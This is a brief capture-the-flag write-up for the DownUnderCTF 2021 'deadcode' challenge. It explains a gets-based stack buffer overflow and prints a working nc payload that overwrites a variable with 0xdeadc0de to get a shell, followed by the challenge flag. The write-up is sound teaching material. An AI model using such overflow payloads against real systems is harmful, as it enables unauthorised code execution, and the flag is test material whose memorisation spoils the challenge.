# Challenge
I'm developing this new application in C, I've setup some code for the new features but it's not (a)live yet.  
  
# Setup
Host: pwn-2021.duc.tf  
Port: 31916  
Executable: [deadcode](deadcode)  
  
# Solution
After decompiling the binary with ghidra, we see that the program was receives user input with the `gets` function, which is [very vulnerable](https://man7.org/linux/man-pages/man3/gets.3.html#DESCRIPTION).  
  
Since the function places no limit to the size of our input, we can create a buffer overflow which overflows past the allocated 24 bytes for us, and overwrite the next variable with 0xdeadc0de in order to get a shell (using `cat -` to keep the pipe open). 
Payload: `(python -c "print 'AAAABBBBCCCCDDDDEEEEFFFF\xde\xc0\xad\xde'"; cat -) | nc pwn-2021.duc.tf 31916`
Flag: **DUCTF{y0u_br0ught_m3_b4ck_t0_l1f3_mn423kcv}**
